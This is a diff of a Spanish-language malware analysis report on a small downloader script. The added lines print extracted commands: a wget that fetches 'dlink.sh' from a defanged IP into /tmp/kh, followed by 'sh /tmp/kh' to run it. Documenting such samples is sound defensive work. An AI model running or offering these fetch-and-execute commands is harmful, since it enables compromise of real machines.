@@ -4,7 +4,11 @@
 
 ## 📌 Resumen
 
-Artefacto identificado como ASCII text, with CRLF line terminators de 225 B. La evidencia estática disponible identifica capacidad de descarga remota. La referencia remota apunta al recurso `dlink.sh` en `hxxp://196.251.121.XXX/a3f8d2/dlink.sh`. Se observaron o extrajeron 1 comandos relacionados con el artefacto.
+Texto ASCII de 225 B. La evidencia disponible identifica capacidad de descarga remota. Recurso remoto principal: `dlink.sh` en `hxxp://196.251.121.XXX/a3f8d2/dlink.sh`. **Comandos observados o extraídos, en orden de aparición en la evidencia:**
+
+1. `sh /tmp/kh'$`
+2. `wget hxxp://196.251.121.XXX/a3f8d2/dlink.sh -O -> /tmp/kh`
+3. `sh /tmp/kh'$ HTTP/` Los comandos se presentan como evidencia observada o extraída; no se afirma ejecución salvo que la relación registrada sea `executed`. **Ficha malware:** [malware-like/oraculo/downloader/75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4.md](../../../../../malware-like/oraculo/downloader/75f9016a9f6bfc836a73e2d0a52b7d566d4b5c8d67777399804cda5828e80cd4.md)
 
 
 ## 🏷️ Clasificación
